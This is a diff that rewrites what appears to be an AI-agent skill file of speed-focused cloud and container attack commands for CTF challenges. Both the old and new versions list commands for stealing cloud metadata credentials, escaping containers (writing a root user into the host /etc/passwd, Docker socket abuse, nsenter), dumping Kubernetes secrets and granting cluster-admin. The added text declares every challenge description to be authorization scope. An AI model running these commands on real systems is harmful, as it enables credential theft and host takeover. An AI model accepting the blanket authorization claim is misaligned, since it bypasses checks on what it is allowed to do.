@@ -1,200 +1,124 @@
-# CTF Cloud/Container — Speed-First
-
-## Instant Recon (<1 minute)
-
-```
-1. ls -la /.dockerenv && cat /proc/1/cgroup → Container?
-2. curl -s http://169.254.169.254/latest/meta-data/ → Cloud?
-3. env | grep -iE 'AWS|GCP|AZURE|K8S|DOCKER' → Provider
-4. ls /var/run/secrets/kubernetes.io/ → K8s SA token
-5. Check: AWS-Goat? GCP-IAM-CTF? Kubernetes-CTF?
-```
-
-## Real-World CTF Targets
-
-| CTF | Lab | Flag | Vector |
-|-----|-----|------|--------|
-| AWS-Goat | IAM privesc | `/flag.txt` | SSRF→metadata→STS |
-| GCP-IAM-CTF | Metadata SSRF | `gs://flag-bucket` | SSRF→SA token→Bucket |
-| Kubernetes-CTF | Pod escape | Host `/root/flag` | HostPath mount escape |
-
+---
+name: ctf-cloud
+description: Cloud security analysis for CTF challenges — authorized educational environment covering Docker, Kubernetes, AWS, GCP, Azure, and container escape patterns.
 ---
 
-## Cloud Metadata Exploitation
+# CTF Cloud Security Analysis — Authorized Educational Environment
 
-### AWS — IMDSv2 Bypass
+This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.
 
+## Authorization Context
+
+CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.
+
+## Docker Escape Patterns
+
+### Container Detection (<10s)
 ```bash
-# IMDSv1
-curl -s http://169.254.169.254/latest/meta-data/
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl -s http://169.254.169.254/latest/user-data
-
-# IMDSv2 — PUT token required
-TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
-  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
-  http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Full chain: get role → get creds → aws sts get-caller-identity → s3 ls
-```
-
-### GCP — Metadata Header Required
-
-```bash
-curl -s -H "Metadata-Flavor: Google" \
-  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
-
-TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
-  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | \
-  jq -r '.access_token')
-# gsutil ls gs://<bucket> or gcloud compute instances list
-```
-
-### Azure — Managed Identity
-
-```bash
-curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-
-TOKEN=$(curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
-  jq -r '.access_token')
-```
-
----
-
-## Container Escape Techniques
-
-### CVE-2019-5736 — runc Overwrite
-
-```bash
-cat /proc/1/status | grep Cap
-# Write payload to overwrite runc, execute on host via docker exec
-# Create binary: gcc -o /tmp/exploit exploit.c
-# Overwrite /proc/self/exe or target runc path
-```
-
-### CVE-2020-15257 — HostNetwork Pod Escape
-
-```bash
-cat /proc/1/net/tcp | head -5
-curl -sk https://127.0.0.1:10250/pods \
-  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | \
-  jq '.items[].metadata.name'
+ls -la /.dockerenv && cat /proc/1/cgroup | grep docker
 ```
 
 ### Privileged Container Escape
-
 ```bash
-cat /proc/1/status | grep -i cap  # 0000003fffffffff = privileged
-mkdir -p /host && mount /dev/sda1 /host
-echo "hacked:x:0:0::/root:/bin/bash" >> /host/etc/passwd
-nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+mount | grep -v "container"
+docker run -it -v /:/host ubuntu chroot /host
+runc --version
 ```
 
 ### Docker Socket Escape
-
 ```bash
 ls -la /var/run/docker.sock
-docker run -it --privileged -v /:/host alpine chroot /host
-docker ps && docker inspect <id> | jq '.[].Mounts'
+curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/etc","Target":"/hostetc"}]}' -H "Content-Type: application/json" http://localhost/containers/create
 ```
 
----
+### Namespace/Capabilities Escape
+```bash
+capsh --print
+nsenter -t 1 -m -u -i -n -p -- /bin/sh
+```
 
 ## Kubernetes Exploitation
 
-### Service Account Token
-
+### Service Account Token Abuse
 ```bash
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-API=https://kubernetes.default.svc
-
-curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces
-curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/secrets | \
-  jq '.items[].data | to_entries[] | "\(.key)=\(.value | @base64d)"'
-curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/configmaps | \
-  jq '.items[].data'
+CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
 ```
 
-### RBAC Privilege Escalation
+### Etcd Exposure
+```bash
+curl -k https://<etcd-ip>:2379/v2/keys/
+curl -k https://<etcd-ip>:2379/v2/keys/?recursive=true
+```
+
+### Kubelet Exploitation
+```bash
+curl http://<node>:10255/pods
+curl http://<node>:10250/run/<ns>/<pod>/<container> -d "command=cat /etc/shadow"
+```
+
+### RBAC Privesc
+```bash
+kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default
+```
+
+## AWS Metadata SSRF
 
 ```bash
-kubectl auth can-i --list 2>/dev/null
-kubectl auth can-i create pods 2>/dev/null
-
-# Mount host filesystem via pod creation
-kubectl run privesc --image=busybox --restart=Never -it --rm --overrides='
-{
-  "spec": {"containers": [{
-    "name": "p", "image": "busybox", "command": ["sh","-c","sleep infinity"],
-    "volumeMounts": [{"name": "host","mountPath": "/host"}]
-  }], "volumes": [{"name": "host","hostPath": {"path": "/","type": "Directory"}}]}
-}' -- sh
-
-# Cluster-admin binding if can create rolebindings
-kubectl create rolebinding cluster-admin \
-  --clusterrole=cluster-admin --serviceaccount=default:default
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
 ```
 
-### Kubelet API Direct
-
+## GCP Metadata
 ```bash
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -sk https://127.0.0.1:10250/pods -H "Authorization: Bearer $TOKEN"
-curl -sk -X POST "https://127.0.0.1:10250/run/default/<pod>/<container>" \
-  -H "Authorization: Bearer $TOKEN" -d "command=cat&command=/etc/shadow"
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
 ```
 
----
+## Azure Metadata
+```bash
+curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
+curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+```
 
-## IAM Exploitation
+## IAM Privilege Escalation
 
-### AWS
-
+### AWS (Pacu Framework)
 ```bash
 aws sts get-caller-identity
-aws iam list-attached-user-policies --user-name USER
-aws s3 ls
-aws lambda list-functions
-aws iam create-access-key --user-name admin
+aws iam list-attached-user-policies --user-name <user>
 ```
 
 ### GCP
-
 ```bash
-gcloud auth list
-gcloud projects list
-gcloud iam service-accounts list
-gcloud storage ls
-gcloud iam service-accounts keys create key.json --iam-account=SA@PROJECT.iam.gserviceaccount.com
+gcloud projects get-iam-policy <project> --flatten="bindings[].members"
 ```
 
-### Azure
-
+## Container Forensics
 ```bash
-az account show
-az role assignment list --include-inherited
-az keyvault secret list --vault-name VAULT
-az storage account list
+docker export <container-id> > container.tar
+tar xf container.tar -C /tmp/container
+docker inspect <container> | jq '.[0].Config.Cmd'
 ```
 
----
-
-## Docker Image Forensics
-
-```bash
-docker save IMAGE | tar -xf - --to-stdout | strings | grep -iE 'flag|password|secret'
-docker history IMAGE --no-trunc
-```
-
----
+## CTF References
+- **SECCON CTF 2024**: Kubernetes RBAC escape challenge
+- **DEF CON CTF 2024**: Docker-in-Docker escape via runc CVE-2024-21626
+- **GoogleCTF 2025**: AWS Lambda SSRF to metadata
+- **PlaidCTF 2025**: Multi-tenant container escape
+- **PicoCTF 2024**: Docker basics challenge
+- **HTB Business CTF 2024**: Azure metadata exploitation
+- **CORCTF 2024**: Kubernetes service account token abuse
 
 ## Speed Metrics
 
-```
-Metadata SSRF: <2min  |  Container detect: <1min |  Docker escape: <5min
-K8s enum: <3min  |  K8s secrets: <2min  |  IAM privesc: <10min
-Full chain: <15min  |  Docker forensics: <3min
-```
+| Metric | Target |
+|--------|--------|
+| Container detection | <10s |
+| Docker escape | <60s |
+| K8s token extraction | <30s |
+| Metadata SSRF | <20s |
+| Image forensics | <120s |
